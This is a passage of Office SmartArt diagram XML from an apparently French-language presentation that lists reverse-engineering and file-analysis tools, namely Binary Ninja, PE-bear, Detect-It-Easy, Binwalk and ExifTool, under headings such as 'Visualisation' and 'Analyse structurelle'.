    <dgm:pt modelId="{1D77E4C3-48A5-4213-941B-7013FC60F9C5}" type="parTrans" cxnId="{CB2855DA-215D-4D7F-A59E-8B8E92B6E74F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B5202C5F-F5F0-453F-8AB7-F77EEB57182B}" type="sibTrans" cxnId="{CB2855DA-215D-4D7F-A59E-8B8E92B6E74F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5680C965-0029-484E-BD21-3CDD40BB0EAC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Visualisation :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{414F146C-4358-497D-ACD6-52B17594F5C1}" type="parTrans" cxnId="{F425B1AD-B1DE-467B-8C17-DD13BF7AD27F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{48B9937B-D5E3-4BFB-9386-353E3DA4FE6B}" type="sibTrans" cxnId="{F425B1AD-B1DE-467B-8C17-DD13BF7AD27F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C024EB35-6F6D-424D-B375-6E3FF7AEAF21}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Binary Ninja pour la navigation dans le code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F3CDEC7D-08B1-45BC-9271-1934F288C072}" type="parTrans" cxnId="{B3CC902E-8CDE-41AF-91AC-0FF26D6EC2B1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AC792C7A-F02C-4271-9D14-EC49245765DD}" type="sibTrans" cxnId="{B3CC902E-8CDE-41AF-91AC-0FF26D6EC2B1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Analyse structurelle :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C2DAB98D-3620-457A-A821-96B8BE32D63F}" type="parTrans" cxnId="{A933E053-D8CB-42E5-8219-ABBFFB9E3077}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{963BD7BD-CE71-40BA-BD03-6B823007CB5D}" type="sibTrans" cxnId="{A933E053-D8CB-42E5-8219-ABBFFB9E3077}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F2EB43A9-A1F8-4AFE-A898-88E511BACA5D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>PE-bear, Detect-It-Easy pour les binaires Windows (PE).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4B0B9401-4E8B-494E-BF97-844E4BA96D2D}" type="parTrans" cxnId="{A88A2067-B5EF-4D00-8BD8-D4DF2220716F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AA06037D-5FC9-444B-841A-17FBD8C7E405}" type="sibTrans" cxnId="{A88A2067-B5EF-4D00-8BD8-D4DF2220716F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{31576252-98EF-4B87-8041-09992E2B4384}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Binwalk, ExifTool pour les fichiers spécifiques.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{65B86747-4C25-433E-9A27-04131E4F0101}" type="parTrans" cxnId="{877766A5-5264-4D92-86B9-1169CB8BD026}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1AB73EEE-F26D-4373-BECE-BE7098D49369}" type="sibTrans" cxnId="{877766A5-5264-4D92-86B9-1169CB8BD026}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" type="pres">
      <dgm:prSet presAssocID="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{65AC9A60-10FB-164A-A8A9-D6449550D786}" type="pres">
      <dgm:prSet presAssocID="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{18E8F783-6FF7-7548-8BBB-3AECA5790598}" type="pres">
      <dgm:prSet presAssocID="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0FCC8A0B-BC00-114E-94B2-44CA99804C77}" type="pres">
      <dgm:prSet presAssocID="{575C54C1-79BD-4EA5-B125-449B5A0C141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130D5D-0A4D-BE49-B3BB-879ECCE1EC29}" type="pres">
      <dgm:prSet presAssocID="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4A069D88-D18E-FC41-BEDD-57DAA52B697C}" type="pres">
      <dgm:prSet presAssocID="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{41184047-C37C-9A40-9BB8-0827417868C2}" type="pres">
      <dgm:prSet presAssocID="{3AD31676-8E06-4C56-98F7-89A64F6C917B}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BA68A3AD-642E-9844-BA23-422F1EB5C62F}" type="pres">
      <dgm:prSet presAssocID="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0AACC43E-52F0-9C4A-B404-88AADFEDF812}" type="pres">
      <dgm:prSet presAssocID="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B16E641D-EF5D-0C4C-BCA5-29F75597D8F7}" type="pres">
      <dgm:prSet presAssocID="{E5EBB192-DDDB-462E-9A95-851AF5EBF08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79A5BBA-B9A4-3F41-8C60-1AFDA1F61297}" type="pres">
      <dgm:prSet presAssocID="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E25A3894-845F-B440-B72D-16635BD7DF3D}" type="pres">
      <dgm:prSet presAssocID="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4935135B-0D89-0E4E-B15E-5ED25BC6FF4D}" type="pres">
      <dgm:prSet presAssocID="{1F5E499A-FE7A-4B27-8F0E-B5255EA9E6B3}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8FE3C438-860E-524D-A40E-B2B58C8AC3E6}" type="pres">
      <dgm:prSet presAssocID="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9E527BBF-817B-C641-9CF4-87004ADEB4C6}" type="pres">
      <dgm:prSet presAssocID="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7D3146EA-70B7-8A4E-8CD6-1B66F50FA3D1}" type="pres">
      <dgm:prSet presAssocID="{5680C965-0029-484E-BD21-3CDD40BB0EA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20A7B18-28B8-4440-8A64-FD45712661C3}" type="pres">
      <dgm:prSet presAssocID="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FF34D8D2-04C2-364D-8571-6979F6CB90B7}" type="pres">
      <dgm:prSet presAssocID="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C5BB50FE-07F9-6442-98DE-6F5367F2DB67}" type="pres">
      <dgm:prSet presAssocID="{48B9937B-D5E3-4BFB-9386-353E3DA4FE6B}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{59D80706-4B91-BE43-88CA-B551C035941A}" type="pres">
      <dgm:prSet presAssocID="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{817FA9B6-E480-434A-AB44-478A7147C715}" type="pres">
      <dgm:prSet presAssocID="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8187FE6D-C4AA-8F4A-97F0-3E919EE64DC7}" type="pres">
      <dgm:prSet presAssocID="{AA77D7D6-5B4B-4175-A789-08C1C5A08D5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CD6D80B-EE1F-2B40-96AD-3CC43D2D98DA}" type="pres">
      <dgm:prSet presAssocID="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{53F1A98A-7FDD-6E47-8DD1-986E74D9E89B}" type="pres">
      <dgm:prSet presAssocID="{AA77D7D6-5B4B-4175-A789-08C1C5A08D5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0125F08-F425-DC4D-BACC-DB63A7BE124C}" type="presOf" srcId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" destId="{817FA9B6-E480-434A-AB44-478A7147C715}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E263801C-837F-E640-B85B-5024D2BE240E}" type="presOf" srcId="{B5B110F3-3D7A-4990-A364-FB9193294D61}" destId="{4A069D88-D18E-FC41-BEDD-57DAA52B697C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F489B51F-E0F9-4E43-9794-861FE6B21F14}" type="presOf" srcId="{F2EB43A9-A1F8-4AFE-A898-88E511BACA5D}" destId="{53F1A98A-7FDD-6E47-8DD1-986E74D9E89B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D7A21021-5B66-1D4C-ACBD-57D2BE2B2E78}" type="presOf" srcId="{31576252-98EF-4B87-8041-09992E2B4384}" destId="{53F1A98A-7FDD-6E47-8DD1-986E74D9E89B}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B3CC902E-8CDE-41AF-91AC-0FF26D6EC2B1}" srcId="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" destId="{C024EB35-6F6D-424D-B375-6E3FF7AEAF21}" srcOrd="0" destOrd="0" parTransId="{F3CDEC7D-08B1-45BC-9271-1934F288C072}" sibTransId="{AC792C7A-F02C-4271-9D14-EC49245765DD}"/>
    <dgm:cxn modelId="{9E4F5C36-E2D7-4406-B7B3-A4A47F580B6D}" srcId="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" destId="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" srcOrd="0" destOrd="0" parTransId="{9C1C4B3C-1E05-4F89-A0B2-2880B0BBDED6}" sibTransId="{3AD31676-8E06-4C56-98F7-89A64F6C917B}"/>
    <dgm:cxn modelId="{2268FA40-E92D-45F3-860C-D5AB9A6415F1}" srcId="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" destId="{B5B110F3-3D7A-4990-A364-FB9193294D61}" srcOrd="0" destOrd="0" parTransId="{C818E6D1-6468-4F06-B53F-B062493520A4}" sibTransId="{FC2AD8F9-0B0A-42FA-BBE3-80FCBF8AF3A1}"/>
    <dgm:cxn modelId="{A933E053-D8CB-42E5-8219-ABBFFB9E3077}" srcId="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" destId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" srcOrd="3" destOrd="0" parTransId="{C2DAB98D-3620-457A-A821-96B8BE32D63F}" sibTransId="{963BD7BD-CE71-40BA-BD03-6B823007CB5D}"/>
    <dgm:cxn modelId="{A88A2067-B5EF-4D00-8BD8-D4DF2220716F}" srcId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" destId="{F2EB43A9-A1F8-4AFE-A898-88E511BACA5D}" srcOrd="0" destOrd="0" parTransId="{4B0B9401-4E8B-494E-BF97-844E4BA96D2D}" sibTransId="{AA06037D-5FC9-444B-841A-17FBD8C7E405}"/>
    <dgm:cxn modelId="{A5152772-18C4-854E-A3C8-5F13FBCEDCAB}" type="presOf" srcId="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" destId="{7D3146EA-70B7-8A4E-8CD6-1B66F50FA3D1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E3BFCE72-2CCF-B248-AD73-FC308DC87020}" type="presOf" srcId="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" destId="{9E527BBF-817B-C641-9CF4-87004ADEB4C6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6925F384-9081-984F-B42D-EFE9688EB9DE}" type="presOf" srcId="{C024EB35-6F6D-424D-B375-6E3FF7AEAF21}" destId="{FF34D8D2-04C2-364D-8571-6979F6CB90B7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4C6BA58F-3B38-984D-86DE-507FF0088E18}" type="presOf" srcId="{7C489AF3-FD0F-4196-BAD1-25A9E8F8DA9E}" destId="{E25A3894-845F-B440-B72D-16635BD7DF3D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E0232396-ECD7-0240-B395-09C4938DCD77}" type="presOf" srcId="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" destId="{0FCC8A0B-BC00-114E-94B2-44CA99804C77}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{877766A5-5264-4D92-86B9-1169CB8BD026}" srcId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" destId="{31576252-98EF-4B87-8041-09992E2B4384}" srcOrd="1" destOrd="0" parTransId="{65B86747-4C25-433E-9A27-04131E4F0101}" sibTransId="{1AB73EEE-F26D-4373-BECE-BE7098D49369}"/>
    <dgm:cxn modelId="{F425B1AD-B1DE-467B-8C17-DD13BF7AD27F}" srcId="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" destId="{5680C965-0029-484E-BD21-3CDD40BB0EAC}" srcOrd="2" destOrd="0" parTransId="{414F146C-4358-497D-ACD6-52B17594F5C1}" sibTransId="{48B9937B-D5E3-4BFB-9386-353E3DA4FE6B}"/>
    <dgm:cxn modelId="{5163C2B1-529B-9C48-9159-C1C649DAC023}" type="presOf" srcId="{575C54C1-79BD-4EA5-B125-449B5A0C1412}" destId="{18E8F783-6FF7-7548-8BBB-3AECA5790598}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DD76CEC3-FFE9-0848-922D-A6792C2E0D92}" type="presOf" srcId="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" destId="{0AACC43E-52F0-9C4A-B404-88AADFEDF812}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{629EEFCA-ABFF-2548-8D64-B72DAB74571C}" type="presOf" srcId="{AA77D7D6-5B4B-4175-A789-08C1C5A08D53}" destId="{8187FE6D-C4AA-8F4A-97F0-3E919EE64DC7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CCEE4EDA-2980-4C25-B266-EDBB113361E9}" srcId="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" destId="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" srcOrd="1" destOrd="0" parTransId="{A30C7FBA-AFE0-4660-B6A2-4A3A38B7DC1E}" sibTransId="{1F5E499A-FE7A-4B27-8F0E-B5255EA9E6B3}"/>
    <dgm:cxn modelId="{CB2855DA-215D-4D7F-A59E-8B8E92B6E74F}" srcId="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" destId="{7C489AF3-FD0F-4196-BAD1-25A9E8F8DA9E}" srcOrd="0" destOrd="0" parTransId="{1D77E4C3-48A5-4213-941B-7013FC60F9C5}" sibTransId="{B5202C5F-F5F0-453F-8AB7-F77EEB57182B}"/>
    <dgm:cxn modelId="{E135D4FC-67A7-2943-9ABB-C4A3D88A6769}" type="presOf" srcId="{E5EBB192-DDDB-462E-9A95-851AF5EBF086}" destId="{B16E641D-EF5D-0C4C-BCA5-29F75597D8F7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1FF3C9FF-9A6D-2540-91A4-58D42E3C0EE3}" type="presOf" srcId="{90F2FD3D-A715-4114-A7B1-0DF973CFA8D2}" destId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{BE87542A-5ADB-854B-8023-21CB47493587}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{65AC9A60-10FB-164A-A8A9-D6449550D786}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A340590B-DF4E-C74A-8EE1-1993CE33FEB8}" type="presParOf" srcId="{65AC9A60-10FB-164A-A8A9-D6449550D786}" destId="{18E8F783-6FF7-7548-8BBB-3AECA5790598}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9C7D90DC-D0CD-D14B-B082-2F0D517933E2}" type="presParOf" srcId="{65AC9A60-10FB-164A-A8A9-D6449550D786}" destId="{0FCC8A0B-BC00-114E-94B2-44CA99804C77}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8B6D6E2A-F987-A642-B4EB-D7BB3B11E416}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{A5130D5D-0A4D-BE49-B3BB-879ECCE1EC29}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{ADC7D30E-2ED4-5946-BF78-8D2E8162B9B1}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{4A069D88-D18E-FC41-BEDD-57DAA52B697C}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{610030B4-0BE3-BB48-87A9-B43921BD38FC}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{41184047-C37C-9A40-9BB8-0827417868C2}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DE267EF2-0EF4-B344-89EF-D78193CF86B9}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{BA68A3AD-642E-9844-BA23-422F1EB5C62F}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F68F4EB4-86B6-A04C-A205-E2ED5DC3A4E4}" type="presParOf" srcId="{BA68A3AD-642E-9844-BA23-422F1EB5C62F}" destId="{0AACC43E-52F0-9C4A-B404-88AADFEDF812}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EF7DE520-0BD6-5446-B8DA-389C01DB4E28}" type="presParOf" srcId="{BA68A3AD-642E-9844-BA23-422F1EB5C62F}" destId="{B16E641D-EF5D-0C4C-BCA5-29F75597D8F7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0F940280-3569-314A-B2B2-AE12F51AC302}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{779A5BBA-B9A4-3F41-8C60-1AFDA1F61297}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{25C48780-3014-304F-AF62-D33A25AEEFBC}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{E25A3894-845F-B440-B72D-16635BD7DF3D}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C24D6E9F-86BD-9F41-A609-C9C7CF96EE9A}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{4935135B-0D89-0E4E-B15E-5ED25BC6FF4D}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{19BCEE53-91A5-4245-BFA7-3CC9BF6A6819}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{8FE3C438-860E-524D-A40E-B2B58C8AC3E6}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{58C04600-8E25-7D45-84D6-E4299E0C8597}" type="presParOf" srcId="{8FE3C438-860E-524D-A40E-B2B58C8AC3E6}" destId="{9E527BBF-817B-C641-9CF4-87004ADEB4C6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7E767BEC-70E8-E342-85BE-CF3757B4113A}" type="presParOf" srcId="{8FE3C438-860E-524D-A40E-B2B58C8AC3E6}" destId="{7D3146EA-70B7-8A4E-8CD6-1B66F50FA3D1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D24EF3E1-4F85-EB43-A612-948A452A4899}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{120A7B18-28B8-4440-8A64-FD45712661C3}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D2CE7CBD-FF4D-9F47-9014-48AC93DC8974}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{FF34D8D2-04C2-364D-8571-6979F6CB90B7}" srcOrd="10" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{245885D7-A54E-9F46-843E-EA891C7C694F}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{C5BB50FE-07F9-6442-98DE-6F5367F2DB67}" srcOrd="11" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FE4B901A-9F33-DC45-9436-9C35913AFAED}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{59D80706-4B91-BE43-88CA-B551C035941A}" srcOrd="12" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{366AE89F-0D1C-E64E-8C26-1D544759BEA7}" type="presParOf" srcId="{59D80706-4B91-BE43-88CA-B551C035941A}" destId="{817FA9B6-E480-434A-AB44-478A7147C715}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6DE90778-3433-1846-BA49-C484ACADE8FB}" type="presParOf" srcId="{59D80706-4B91-BE43-88CA-B551C035941A}" destId="{8187FE6D-C4AA-8F4A-97F0-3E919EE64DC7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{49B3DB20-A0E2-F14F-AC65-26031500E61D}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{ECD6D80B-EE1F-2B40-96AD-3CC43D2D98DA}" srcOrd="13" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{253F978A-C8C0-EC47-A89A-CD090B2A0E88}" type="presParOf" srcId="{D33D5C79-BC3A-074A-B6D2-E8F8B7CE5F83}" destId="{53F1A98A-7FDD-6E47-8DD1-986E74D9E89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4D679550-521E-4095-888C-23DC3383207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569EF64-3EF8-428B-A3AA-63FEAB06AA01}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Avantages :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
